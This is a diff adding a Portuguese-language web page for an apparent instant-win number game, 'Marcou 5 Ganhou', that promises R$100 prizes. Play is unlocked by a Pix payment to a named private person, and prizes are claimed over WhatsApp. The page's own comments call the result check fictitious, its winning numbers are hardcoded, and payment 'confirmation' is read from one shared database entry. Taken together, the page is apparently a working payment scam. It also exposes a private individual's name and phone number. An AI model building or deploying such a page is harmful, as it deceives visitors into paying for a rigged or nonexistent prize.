@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Marcou 5 Ganhou</title>
+<link rel="shortcut icon" type="image/jpg" href="https://raw.githubusercontent.com/SuaSortehoje/Pixplay/refs/heads/main/dinheiroFacil.jpg">
+<link rel="icon" href="https://raw.githubusercontent.com/SuaSortehoje/Pixplay/refs/heads/main/dinheiroFacil.jpg" type="image/jpg">
+<style>
+/* Aqui entra todo o CSS que você já tinha */
+body { font-family: Arial, sans-serif; background: url('https://picsum.photos/1600/900?random=1'); background-size: cover; min-height: 100vh; background-position: center; }
+.fundoCimar { background: purple; transition: background-color 0.5s; color:white; border-radius:30px 30px 0px 0px; }
+h1 { display:flex; justify-content:center; font-size:15px; }
+p { font-size:14px; text-align:center; color:gold; font-weight:bold; }
+.btn { margin:2px; padding:10px 20px; border:1px solid #ccc; border-radius:5px; cursor:pointer; }
+.btn.selected { background-color:black; color:white; }
+.btn.blocked { background-color:red; color:white; font-weight:bold; }
+.btn.vender { background-color:green; }
+.btn.green { background-color:green; color:white; }
+#numeros { display:grid; grid-template-columns: repeat(5, 1fr); gap:1px; max-width:350px; margin:0 auto; }
+#numerosBloqueadosContainer { display:none; grid-template-columns: repeat(5,1fr); gap:1px; max-width:350px; margin:20px; }
+.codig { display:inline; text-align:center; width:40%; margin-top:0px; margin-bottom:10px; border-radius:10px; }
+#verificar { display:inline; width:70%; margin-left:10px; margin-top:12px; background:skyblue; color:black; border-radius:10px; font-weight:bold; }
+.blink { font-weight:bold; margin:5px; animation: blink 1s steps(1,end) infinite; }
+@keyframes blink { 0%{opacity:1;} 2%{color:green;} 4%{color:gold;} 6%{color:lime;} 50%{opacity:0;} 51%{color:gold;} 56%{color:lime;} 80%{opacity:1;} 85%{color:gold;} 86%{color:lime;} }
+.pagar { color:white; font-size:18px; }
+.regra { text-decoration:none; color:blue; border-radius:10px; text-align:center; }
+.regraDiv { text-align:center; }
+.credito { margin-left:5px; margin-top:12px; background:green; color:white; border-radius:10px; font-weight:bold; }
+.valorSacar { width:80px; margin-left:260px; border-radius:10px; text-align:center; font-weight:bold; background:grey; outline:none; }
+.disponivel { text-align:right; font-size:12px; font-weight:bold; }
+.sacar { background:grey; color:black; font-weight:bold; border-radius:10px; margin-left:5px; }
+.centra { text-align:center; }
+.btns { display:inline; text-align:center; width:60%; }
+.slideshow { position:absolute; width:70%; height:30px; overflow:hidden; border:1px solid red; }
+.slideshow img { position:absolute; top:0; left:0; width:100%; height:30px; animation: fade 20s infinite; }
+@keyframes fade { 10%{opacity:1;} 50%{opacity:0;} 100%{opacity:0;} }
+.modal { display:none; position:fixed; z-index:1000; padding-top:80px; left:0; top:0; width:100%; height:100%; background-color: rgba(0,0,0,0.7); }
+.modal-content { background-color:#222; margin:auto; padding:20px; border-radius:10px; width:90%; max-width:400px; color:white; text-align:center; }
+.closeBtn { color:#aaa; float:right; font-size:28px; font-weight:bold; cursor:pointer; }
+.closeBtn:hover { color:white; }
+</style>
+</head>
+<body>
+<script type="module" src="script.js"></script>
+<!-- Modal QR Pix -->
+<div id="alertModal" class="modal">
+    <div class="modal-content">
+        <span class="closeBtn">&times;</span>
+        <p>CODIGO DE ACESSO, SERA GERADO E LIBERADO APÓS O PAGAMENTO DE FORMA AUTOMÁTICA!</p>
+        <h3>Pagamento via Pix</h3>
+        <img src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=00020126360014br.gov.bcb.pix0114+557199229005852040000530398654042.005802BR5922Carlos%20Dos%20Santos%20Reis6009Sao%20Paulo610901227-20062230519daqr26564427370426763043E96" alt="QR Code Pix">
+        <p>Copie o código Pix abaixo:</p>
+        <textarea readonly>00020126360014br.gov.bcb.pix0114+557199229005852040000530398654042.005802BR5922Carlos Dos Santos Reis6009Sao Paulo610901227-20062230519daqr26564427370426763043E96</textarea>
+    </div>
+</div>
+
+<div class="fundoCimar">
+    <h1>MARQUE E GANHE NA HORA R$ 100.00</h1>
+
+    <div class="inputnormal">
+        <input class="codig" type="number" id="codigo" placeholder="Digite Código Acesso">
+        <button id="refreshBtn" class="credito">COMPRAR CODIGO</button>
+    </div>
+
+    <div id="numeros"></div>
+    <div class="grupamento">
+        <div class="btns">
+            <button id="verificar" onclick="verificar()" disabled>VER RESULTADO</button>
+            <button class="sacar" onclick="gerar()" disabled>SACAR</button>
+        </div>
+        <p id="mensagem"></p>
+        <div id="numerosBloqueadosContainer"></div>
+        <p class="contaNumero" id="contadorNumeros">Números selecionados: 0/15</p>
+        <button id="enviar" style="display:none;margin-left:30%" onclick="enviarViaWhatsApp()">RECEBER O PREMIO</button>
+    </div>
+</div>
+
+<!-- WhatsApp fixo -->
+<a href="https://wa.me/5571992290058" style="position:fixed;width:35px;height:35px;bottom:20px;right:20px;color:#25d366;border-radius:50px;text-align:center;font-size:30px;z-index:1000;">
+<i style="margin-top:16px" class="fa fa-whatsapp"></i></a>
+
+<!-- Scripts do jogo e Firebase -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";
+
+// Config Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyBPCb84OTJTcW1WDrZ41RNmXddlGhDgeI0",
+  authDomain: "gamewin-aa8b2.firebaseapp.com",
+  databaseURL: "https://gamewin-aa8b2-default-rtdb.firebaseio.com",
+  projectId: "gamewin-aa8b2",
+  storageBucket: "gamewin-aa8b2.firebasestorage.app",
+  messagingSenderId: "378162274661",
+  appId: "1:378162274661:web:f5188bee8090f0d4a0818c"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const pagamentoRef = ref(db, 'pagamentos/12345'); // Nó do pagamento
+
+// Botões e contadores
+const numerosContainer = document.getElementById("numeros");
+const verificarBtn = document.getElementById("verificar");
+const enviarBtn = document.getElementById("enviar");
+const refreshBtn = document.getElementById("refreshBtn");
+const contadorNumeros = document.getElementById("contadorNumeros");
+
+let selecionados = [];
+const MAX_SELECIONADOS = 15;
+
+// Cria 50 botões de números
+for (let i = 1; i <= 50; i++) {
+  const btn = document.createElement("button");
+  btn.id = `num${i}`;
+  btn.innerText = i;
+  btn.classList.add("btn");
+  btn.disabled = true; // inicialmente bloqueado
+  btn.addEventListener("click", () => selecionarNumero(btn, i));
+  numerosContainer.appendChild(btn);
+}
+
+// Função de seleção de número
+function selecionarNumero(btn, numero) {
+  if (selecionados.includes(numero)) {
+    selecionados = selecionados.filter(n => n !== numero);
+    btn.classList.remove("selected");
+  } else {
+    if (selecionados.length < MAX_SELECIONADOS) {
+      selecionados.push(numero);
+      btn.classList.add("selected");
+    } else {
+      alert("Você já selecionou 15 números!");
+    }
+  }
+  contadorNumeros.innerText = `Números selecionados: ${selecionados.length}/${MAX_SELECIONADOS}`;
+}
+
+// Verificação fictícia de resultado
+function verificar() {
+  const ganhadores = [3, 7, 12, 20, 25, 30, 33, 38, 44, 49]; // exemplo
+  const acertados = selecionados.filter(n => ganhadores.includes(n));
+  alert(`Você acertou ${acertados.length} números!`);
+  if (acertados.length >= 5) {
+    enviarBtn.style.display = "block";
+  }
+}
+
+// Envio via WhatsApp
+function enviarViaWhatsApp() {
+  const numerosStr = selecionados.join(", ");
+  const mensagem = `Meus números: ${numerosStr}\nQuero receber o prêmio!`;
+  window.open(`https://wa.me/5571992290058?text=${encodeURIComponent(mensagem)}`, "_blank");
+}
+
+// Monitoramento do Firebase
+onValue(pagamentoRef, (snapshot) => {
+  const status = snapshot.val();
+  if (status === "confirmado") {
+    // Libera todos os botões
+    for (let i = 1; i <= 50; i++) {
+      document.getElementById(`num${i}`).disabled = false;
+    }
+    verificarBtn.disabled = false;
+    refreshBtn.disabled = false;
+    alert("Pagamento confirmado! Você pode jogar agora.");
+  }
+});
+
+// Modal Pix
+const modal = document.getElementById("alertModal");
+const closeBtn = document.querySelector(".closeBtn");
+refreshBtn.addEventListener("click", () => modal.style.display = "block");
+closeBtn.addEventListener("click", () => modal.style.display = "none");
+window.addEventListener("click", (e) => { if (e.target == modal) modal.style.display = "none"; });
+</script>
